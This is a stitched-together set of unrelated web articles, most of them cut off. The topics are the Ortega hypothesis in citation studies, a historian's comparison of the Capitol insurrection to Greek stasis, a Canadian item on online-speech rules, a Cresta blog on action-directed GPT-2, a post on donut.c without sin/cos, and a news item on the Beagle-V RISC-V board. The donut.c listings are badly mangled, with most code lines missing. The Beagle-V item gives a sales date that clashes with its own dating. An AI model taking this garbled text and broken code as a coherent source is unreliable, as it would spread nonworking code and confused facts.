<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincaré, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of …</p></blockquote></div></div>

<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>

<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don’t particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife – <em>stasis</em> – in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I’m going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators – some deluded, some acting in bad faith – attempting to insist that this wasn’t serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), “In the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.”</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‘c’ is hard, so Ki-lon – or if you prefer the Greek, Ku-lon – not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon’s effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‘Four Hundred’ would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> – it’s council (Thuc. 8.69).  <strong>That’s four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way – that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos’ band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we’ll come back to it).  Peisistratos’ second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn’t mean it can’t work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‘censorship’ on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean – but true – words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‘fools’ and ‘enemies’ – fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>

<h2>This Is Not Over</h2>



<p>Let’s come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We’ve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles – someone we might term an ‘establishment’ figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn’t the end of the matter. Peisistratos, once out of power again used his wealth and support – often foreign support, we are told – to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos’ partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>



<p>I don’t know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we’ll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we’ll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn’t</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn’t) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect …</p></div></div>

		<h3>Politicians say ‘protect,’ they often mean ‘control.</h3>
		

		
		<p><span><em><strong>WINNIPEG, MANITOBA ~~~~~~~ January 14, 2021&nbsp; (LSN)&nbsp;</strong></em>&nbsp;politicians say ‘protect,’ they often mean ‘control.&nbsp;&nbsp;Heritage Minister Steven Guilbeault and the Liberal government have announced they will be introducing regulations to ‘protect Canadians online.</span></p>

<p><span>According to&nbsp;<a href="https://www.blacklocks.ca/protect-public-from-twitter/" rel="noopener" target="_blank">Blacklock’s Reporter</a>, the legislation will be designed to ‘curb’ ‘hurtful or offensive’ social media posts:</span></p>

<blockquote>
<p><span><em>“Cabinet will introduce 2021 regulations to curb Twitter and Facebook posts deemed hurtful or offensive, says Heritage Minister Steven Guilbeault’s department. Hate speech is already forbidden under 1970 amendments to the Criminal Code: “We want to protect Canadians online.””</em></span></p>
</blockquote>



<p><span>The point that hate speech is already illegal is important to note.</span></p>

<p><span>The government has existing legal and legislative authority to confront hate speech, whether it happens online or offline.</span></p>

<p><span>Yet, rather than using that authority, the government is seeking more authority and more legislation.</span></p>

<p><span>And this has many people understandably concerned, because when politicians say ‘protect,’ they often mean ‘control.’</span></p>



<p><span>We have seen that through the current virus crisis, where politicians have moved in an increasingly authoritarian direction while justifying it as being about ‘protecting’ people.</span></p>

<p><span>As a result, there are legitimate concerns that the federal government will seek to further limit what people can say, in a way that is about protecting political interests rather than confronting true hate.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At Cresta, we empower sales and support agents that talk to their customers over chat to become experts on day one. We do that by providing them real-time suggestions about how they should respond to their customers. The suggestions as shown in the image below are fully formed responses that can either be sent directly or after light editing by the agents.</p>
<figure id="attachment_19262" aria-describedby="caption-attachment-19262"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png" alt="" width="619" height="350" srcset="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png 619w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034053/gpt-2-300x170.png 300w" sizes="(max-width: 619px) 100vw, 619px"><figcaption id="caption-attachment-19262">Agents can choose to respond with these generated suggestions.</figcaption></figure>
<p>By suggesting great responses, we help sales agents sell more and help support agents resolve issues quickly. These suggestions also make agents more efficient by saving them a lot of time from manually typing responses.</p>
<p>With this blog, we would like to share an exciting new machine learning model we designed and deployed in early 2020, to generate these expert suggested responses which have driven improvements in sales conversion for our customers</p>
<p>But before introducing the new model, let’s understand the general problem we are trying to solve by focusing on the domain of sales.</p>
<h2>ML for Sales Conversations</h2>
<p>When a sales representative joins a new company, they spend about 6 months learning the ropes and gaining experience until becoming completely effective in their roles. Traditionally, the agents are coached by a sales leader who would listen to conversations and jump in at the right moment to guide the representative. The sales leader may tell the agent to take actions like “Ask for a sale”, “Discover customer’s needs”, “Greet the customer” etc. In the context of live chat, it’s valuable to have a real-time coach to guide responses.</p>
<p>Cresta’s platform helps to solve this training problem by creating individualized responses for each agent. At appropriate moments in the conversation, sales agents can use these suggestions to answer customer inquiries more quickly and more effectively. Our models analyze the ongoing sales conversation to understand the situation, and then suggest the next best response to say according to the next best action to take.</p>
<h2>Language Models for Dialog</h2>
<p>The problem of generating the next response can be solved by training a language model on a dataset of conversations. When we represent dialog as text, we can train a language model on that text and then ask the language model to generate the probable next response given an in-progress conversation. In practice, we have seen that this method works well as pre-trained language models have become very powerful in the past 2 years. These language models usually generate coherent responses.</p>
<p>But just generating coherent responses is not enough. We also want the system to generate the best response to reach the goal of successfully converting a sale. However, a major problem with such language models is that they are difficult to control. This means that it is hard to ask the model to generate a certain type of response.</p>
<p>Now, for example, imagine Alice and Bob are having a conversation…</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png" alt="" width="2000" height="996" srcset="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-300x149.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1024x510.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-768x382.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1536x765.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1200x598.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1980x986.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"></p>
<p>All the possible responses by Bob are valid responses that a language model might generate. These responses correspond to different actions that Bob might take. We want to control language models to generate responses that help Bob achieve his goal, whatever that might be.</p>
<h2>Need for Controlling language models</h2>
<p>At Cresta, the language model is trained on the real chats of agents, and we find that different agents respond differently to the same situation. We also find that not every agent in a conversation answers perfectly. All this leads to high variance and noise in the training dataset. Thus from this dataset, the model learns a wide distribution of the next possible responses. Since the trained model is more uncertain about the next response, it becomes hard for the model to generate the best response reliably.</p>
<p>In the field of sales, agents use a call-flow which describes what sequence of actions they ideally need to make to get the sale. The best next action for instance could be to ask to close a sale during an appropriate opportunity. To improve the probability of agents making a successful sale, we also want our models to generate a response according to the best next action in that situation. Certainly, a model that generates text that is all over the place won’t suffice.</p>
<p>With our analysis, we also verified that when agents follow the best sequence of actions, it leads to significantly higher sales as shown in the analysis below.</p>
<figure id="attachment_19258" aria-describedby="caption-attachment-19258"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/9f56b1d58e734c358b3bc279a70a3065ee0db37d/3362f/static/d1eb97d18515af49c082d840a5178c91/gpt-2-2.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19258">For the chats by expert agents that converted in sales, we see that they largely follow the call-flow. e.d. means edit distance of the real conversation from the call-flow. For example, e.d. of 1 means that the agent deviated by 1 action from the call-flow.</figcaption></figure>
<figure id="attachment_19256" aria-describedby="caption-attachment-19256"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/e9435e03b89fca5e74dba02bc22d9bf142bf13b8/ca507/static/cbc474416957f16a7790ed95e2d180e9/gpt-2-3.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19256">For the chats by all the agents that did not convert in a sale, we see that they deviate strongly from the call-flow.</figcaption></figure>
<p>Instead of relying on training with a maximum likelihood objective to maximize the probability of the next token in the training corpus [1], we want to generate goal-directed responses following a call-flow that maximizes the business metric of sales conversion.</p>
<p>To solve this problem, we designed a controllable language model called “Action-directed GPT-2.”</p>
<h2>Action Directed GPT-2</h2>
<p>Since we want sales agents to follow a call-flow that defines the best sequence of actions they need to make to make a sale, we also want the suggestions to follow that call-flow.</p>
<p>We break the problem of suggestions following a call-flow into two parts-</p>
<ol>
<li>Predict the next best action.</li>
<li>Generate a good response for that action.</li>
</ol>
<p>A typical classical dialog state tracking system also follows a similar architecture where it uses a dialog policy to predict the next action and then selects the response based on a template. According to our experience, such a system does not work well because the real-world conversations are too complex to model with a finite number of states. Even if we were to model the states correctly, the text generations from a template would seem robotic and would not be contextually adapted to the current conversation. These reasons lead to low usage of such suggestions by the sales agents.</p>
<p>To successfully generate contextually accurate responses that follow the correct next action, we train GPT-2, [2] a large language model, to model the problem as learning the probability of the next response given the current state of the conversation and the next best action. This is represented in the figure below.</p>

<h2>Data representation for Action Directed GPT-2 model</h2>
<p>There are multiple possible approaches for feeding the action information to the model. This includes adding an extra embedding layer to GPT2 which learns an action-dependent embedding that represents the action a message performs. Although through experimentation, we discovered that representing actions inline as text resulted in a model that is easier to work with, which also performs very well.</p>
<p>Following is an example of the textual representation on a hypothetical chat with hypothetical actions. Over here, the text in <strong>bold</strong> is the action label for the following message.</p>

<h2>Training and inference</h2>
<p>With this representation, we require action labels for messages in the training set and since there can be millions of such messages, it is not feasible to label them manually. We instead use action classification models to label agent messages in the entire training set with their corresponding actions. The messages can also be classified as no action performed, and there is no inline action label for such a case. When all the training set chats are annotated, we use the resulting text representation to train a standard GPT-2 model. GPT-2 being a causal language model, learns to map an action to its associated agent message. Training with a standard language modeling loss function and gradient descent results in the model automatically learning the relationship of the next response to the action and the chat context.</p>

During inference time, we take the current state of the chat, annotate each agent message with its action, take the next best action prediction of the next agent action model and convert it all to a text representation. Once we know the next action to take, there is no significant time penalty during generation so the model also demonstrates high inference performance when deployed. If the next action prediction model does not predict any action, the action directed GPT-2 model falls back to a standard language model generating a response without any action direction.</p>

<p>After deploying the model to our customers, we found that responses generated by the Action directed GPT-2 help the agents follow the best call flows increasing our customer’s most important sales metrics.</p>
<h2>Conclusion</h2>
<p>The exciting discovery for us was to discover how simple it is to take an off-the-shelf pre-trained language model and make it controllable without changing anything about the underlying model architecture. If you take a standard pre-trained model and finetune it on a noisy dataset, you can still make the model follow perfect behavior by directing the model correctly during runtime.</p>

<article>
  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that’s always been sort of unfortunate is the heavy use of <code>sin</code> and
<code>cos</code> – both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded
device</a>.</p>

<p>So, here’s a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<div><div><pre><code>             i,j,k,x,y,o,N;
         main(){float z[1760],a
      #define R(t,x,y) f=x;x-=t*y\

   =0,e=1,c=1,d=0,f,g,h,G,H,A,t,D;char

   (k%80?b[k]:10);R(.04,e,a);R(.02,d,
     c);usleep(15000);printf('\n'+(
        " donut.c! \x1b[23A"));}}

<p>It’s a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there’s <em>slightly</em> less code than filled
pixels – oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn’t really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you’ll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don’t need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2π</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there’s a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we’re back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we’re
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude “close enough” to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x’</em>, which will be “closer to”
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is “close to” 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we’re only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don’t have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we’re only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I’ve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the “matrix
multiplication” on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I’ve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

  x -= mul*y&gt;&gt;shift; \

<p>chip Photo:VCG</p><p>The world's first RISC-V single board PC Beagle-V based on Linux operation system was debuted by Shanghai tech firm StarFive on Wednesday. The computer was co-developed by StarFive, Shenzhen Seeed Studio and US SBC (single board computer) company Beagleboard, paper.com reported.&nbsp;</p><p>Beagle-V uses the domestic made SoC (system-on-a-chip) artificial intelligence vision processing chip by StarFive and can be used in areas of mechanical engineering, data center, artificial intelligence and cloud computing, said the report.&nbsp;</p><p>RISC stands for the Reduced Instruction Set Computer, which is a computer with a small, highly optimized set of instructions and with highly-improved operational efficiency. RISC-V is the fifth generation of the RISC.&nbsp;</p><p>Founder and CEO of StarFive Xu Taojin said that Beagle-V will meet industry requirements of demo board with high-performance, multifunction and low-cost. "Beagle-V has a small size of 85 millimeters multiple 70 milimeters and feature of energy saving, which is an ideal solution for single board computer," said Xu.</p><p>Geng Bo, deputy secretary-general of the China Solid State Lighting Alliance, told Global Times that RISC-V and ARM (Advanced RISC Machine) are two representative types of Reduced Instruction Set Computer invented in 1980s with most differences between two processors the design style and open source degree.&nbsp;</p><p>"Because ARM is not open source, the users of ARM have to adjust frequency and power dissipation of the products follow the original design of the ARM processor and to pay expensive license fee," said Geng.</p><p>Geng referred to the open source and zero license fees of RISC-V attracting more developers. "It's said that ARM had canceled license fees for the companies with financing amount lower than $5 million, to compete with its opponent RISC-V on the aspects of pricing," said Geng.</p><p>During the ceremony, officers of Shanghai government said the government will support the development of high technologies including RISC.</p><p>Beagle-V will start selling in March 2020 and will be opened to the broader market in the second half of 2021.&nbsp; </p></div>

	<div>
		<article>
